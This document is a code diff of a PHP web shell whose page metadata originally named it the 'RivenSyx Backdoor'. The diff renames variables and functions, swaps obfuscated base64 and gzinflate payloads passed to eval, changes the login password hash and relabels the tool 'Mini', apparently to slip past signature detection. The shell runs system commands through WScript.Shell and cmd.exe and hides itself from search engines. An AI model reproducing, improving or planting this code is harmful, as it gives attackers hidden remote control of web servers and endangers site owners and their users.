@@ -186,9 +186,9 @@ function rivenC($komendnya)
         $out = $sh_exc($komendnya);
         return trim($hayoloh(stripslashes($out)));
     } elseif ($func_exist($com)) {
-        $shell = new $com($wscsh);
+        $cangkang = new $com($wscsh);
         $kom_mand = "$cMdexe /c " . $komendnya;
-        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
+        $output = $cangkang->Exec($kom_mand)->StdOut->ReadAll();
         return trim($hayoloh(stripslashes($output)));
     } else {
         return 'The F' . 'un' . 'ct' . 'io' . 'n T' . 'o R' . 'u' . 'n The C' . 'om' . 'ma' . 'nd I' . 's Di' . 'sa' . 'bl' . 'e On T' . 'h' . 'is Se' . 'rv' . 'er';
@@ -243,20 +243,20 @@ function rivenRead($this_file)
     }
 }
 
-function LTs($bLTs)
+function lites($monar)
 {
     $gflate = 'g' . 'zi' . 'nf' . 'la' . 'te';
     $b64 = 'ba' . 'se' . '64_' . 'de' . 'co' . 'de';
     $nelrts = 'st' . 'rl' . 'en';
     $rhc = 'c' . 'h' . 'r';
     $dro = 'o' . 'r' . 'd';
-    $bLTs = $gflate($b64($bLTs));
-    for ($i = 0; $i < $nelrts($bLTs); $i++) {
-        $bLTs[$i] = $rhc($dro($bLTs[$i]) - 1);
+    $monar = $gflate($b64($monar));
+    for ($i = 0; $i < $nelrts($monar); $i++) {
+        $monar[$i] = $rhc($dro($monar[$i]) - 1);
     }
-    return $bLTs;
+    return $monar;
 }
-/***#***/ @/*55555*/eval/***#***/(LTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));
+/***#***/ @/*55555*/eval/***#***/(lites("nVB/T9swEP0AfIrMypbkD9IWLRQaZVVGXFrR0uAkgw0iKyVHki2/FrsChvjsM2mp+KlJsyz5zvfeu7snSQ9nK7tSP0BR81tVph4m3zA5V8a+79KD6QQf+3TiKqGm3clZHcVxA4xZ7+N0dNFclMi8h5yB9K7yGR3NyalNHOw8RP/Qf4V+1uVtIsGzuY+p7ThP8fKiqa4ZNC87BCKj9qHYQglN+ZcA1GlNl2VUgKqZMkvpsskt+Q6taej+HK0iemzPMAr15zV37IpsOkJCTTCZpb5lgyf2Hiop57UyaB+maDoadDobWDvceO754eaL4JMAez4NyCREpszhhluIwO8lMC4FZDqQkN721NHHri3uKSxYCnkuBU3eFv9ji0etidsqbAzXkUjXtUD4um0nUPIWs3b6sXoETQmr/sJe8yrLgSbA6WVVckFhKmoNEMtHdaZzyCFpokKvmqSzqHjf2N/t9Y3uzs7Atsc3f36MZol39r3wvvZ+cuPaiQgvvPggqA5xujzpMCjjmRgvSmB4mUacZrG1/Xnf6PaNvX5v99PKNL01TzO3hl/+Ag=="));
 
 $whoami = "\x52\x69\x76\x65\x6e\x53\x79\x78";
 $profile = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x73\x2e\x63\x6c\x6f\x75\x64\x69\x6e\x61\x72\x79\x2e\x63\x6f\x6d\x2f\x64\x64\x39\x65\x61\x74\x6d\x6a\x75\x2f\x69\x6d\x61\x67\x65\x2f\x75\x70\x6c\x6f\x61\x64\x2f\x76\x31\x37\x35\x33\x30\x31\x30\x33\x32\x39\x2f\x73\x69\x67\x6d\x61\x53\x79\x6e\x78\x5f\x61\x74\x61\x6d\x36\x31\x2e\x70\x6e\x67";
@@ -479,7 +479,7 @@ $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@' . $jquery_version . '/dist/jquery.min.js';
 $ajax_version = '3.5.1';
 $ajax = 'https://ajax.googleapis.com/ajax/libs/jquery/' . $ajax_version . '/jquery.min.js';
-$passwd = 'c62782a8e5dd7c4cffef6ba35233b5846a3db219'; //change this password
+$passwd = '168f968e8921464e375e3056699c78c68530778e';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['gasken'])) {
     if (SHA1($_POST['passnya']) == $passwd) {
@@ -495,7 +495,7 @@ if (isset($_POST['gasken'])) {
                 $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
             }
             return $defconf;
-        }/***#***/ @/*55555*/eval/***#***/(setconf("hVbbTttAEP2AfsXWykN4qTzr3XUSq60qSoWEKqoQ+kCNIpPYEBGSKA6qKeLbO5f1JaSokVa21+MzM2fOzEYp/L1Tt+vdWo2rWfwtUWeT3bgYqWKxzKe3+W46W692+WpX9oMUbJhWsUnB0QpxRWkVZamN00oXKRjA12jihql1bFU5i2vmr2gWazFzczbBL8HRVswgeFu5gn2gMT1F5MH4K2JEkDrHF3nMUgiBV2Us4tG7AWIiNkYCgPgx2SI4+qDgTJZWFoNFCMqBkAmRUsOgQKMzCgWdAmAA8RA/wZAIMaQkMBB3g3vAdJA9OMpbMogjn2uOiyAsPxNTzBaZEg9kExFlkbDKEIYjI/ro29im1mccphypbhZTI8Fzeq7eMU4qRGQQAVSDaB6oD6q3y6vdUSK1fvp6eRomqlwe68lI9TZZWWblcqE+qt70x/nF5FfgKwmSUhwxt8ylg+DawyzOL8+2iShnpBaF6r/PHza7p35venEy/nkyJhwz8KxiWDqUFCltwD0z5LpVJvc2Be+hXXB9dKSeVW+xyebzbV6WHNseqiAKKmCFIcRIzUwQsFYAbg8VaxxcIxMk5LTKgkS9qHxZ5ujm36EDhIdOIrlWxDQKA7RmwbAELd4b41MSxxA6kaHW/0mp9tYlirx1UcgD6Fjkp1tvENZpdrzVqYLupvomowTNrFnvyshzFPseM7Ia6GpeQ7+IHB6Lu/BPIqrwqspXM3RzcfoF+nvKoiHADeGVRX2Ge0iRl9bVdDipEoFErJvt+neZbw9FILXpSMtSwpE0K9WD2QNuf2ZKRNFIuCwn36NE3KGf8m76uF2Sm+fA40XyHdfZSW2tDl6oYnt+XHPPlIGTKhGdoWXKCJO1Y9vvQLsanzF5ELG4vd5qHyhsVEET9/HVfYb8cPgY9z1zs7nbTB9X2UPer2nkDk/EeiQzAO2CpqIUognZC3s13hM1JzGKjSlNOiCzymgvOyRGW544TK6/JzSenjTyyJZH3kDGEekJF3uzPPbpZMADwYTBK3I8yQ2pLTmHhEthCh/qIeF1EWtbIryLyY3NrfcG4aL1ToYYnKtzDX0rRkIhDQLfptyaeD757JoRS2gtgmlhxWnOw1FUBF7Vxr/zNek4ZbKIcD+JuKRa6klJUXFohu/HQU3ZhlEX0N8CiNu2MO3A4I94M+hGblolUGm5p2kPIagbadvE7bmI51MLXjf2K8i9gCJ/hmoZFfV/CkwKc2UUlL8XPP99SeSAG6nPn/4C"));
+        }/***#***/ @/*55555*/eval/***#***/(setconf("nVHtTtswFH0AnsKzsjX9QdqihY5GGTKNS6q1TUjSFVYqy21NEpYvxa6AIZ4dp23QGEOTZvnHvT7nnutzLwDVOYhv1A8sLcSDqhAfe9+xN2/YQeCS/miIJwEZuo1Fs/moxAVdr0vGufk+T4PX5XUGjSeWcAbeVb4kA8ebIc/CVhX9Q/8N+1WXvxd6eOwEmCDL+p2vLMv8jrPyzw5TmRF0Ll00FobyUxKKqCCbjKZMbRpKQTmnPIllmev4wbxRPWQPtCJXIctWpm+jjvoGl8U8IpsyMZVHuO8Jn+ZwF5EJGmO40F5jru3KbDSAUl2we2FCZCHg23g0ApOhDc4852MbyTtjSx6xJAHTMukBqP1PCw3utFzk+zPHs7Y6td8axJO+d+UG2AI1DVR2X7jSf00dutvXl5VoUKZ7bConf4hCloktZ7+LGv3GyoztfMgFGDdxwkjIBFnlmZAlXIWREAXvtVq0iDXBEhaWNNXyMmwtc9HVT447Xb19dNRDyL7/9WMwDv3Lq9Q/69wK/c6inkj9dX+an+Noc9GSX16P5fdoyE5XERUkXpuHn0/0dlf/0u0cf9rNXdvOv2kcnH59Bg=="));
         echo "<s" . "cr" . "ip" . "t>" . "al" . "er" . "t(" . "'Lo" . "gi" . "n " . "Su" . "cc" . "es" . "s!" . " Yo" . "u " . "Pr" . "o'" . ");" . "</" . "sc" . "ri" . "pt" . ">";
         $_SESSION["gidauth"] = "gidauth";
         setcookie('token_gid', $my_self, time() + 3600 * 24);
@@ -559,14 +559,14 @@ $path = str_replace("\\", "/", $path);
     <title>..::<?= $whoami ?>::.. <?= $this_domain ?></title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=1024" />
-    <meta name="description" content="<?= $whoami ?> Backdoor" />
+    <meta name="description" content="<?= $whoami ?> Mini" />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
     <meta property="og:site_name" content="<?= $whoami ?>" />
     <meta property="og:url" content="<?= $this_url ?>" />
     <meta property="og:title" content="..::<?= $whoami ?>::.. <?= $this_domain ?>" />
-    <meta property="og:description" content="<?= $whoami ?> Backdoor" />
+    <meta property="og:description" content="<?= $whoami ?> Mini" />
     <meta property="og:image" content="<?= $profile ?>" />
     <meta property="og:image:secure_url" content="<?= $profile ?>" />
     <link rel="shortcut icon" href="<?= $icons ?>" type="image/x-icon" />
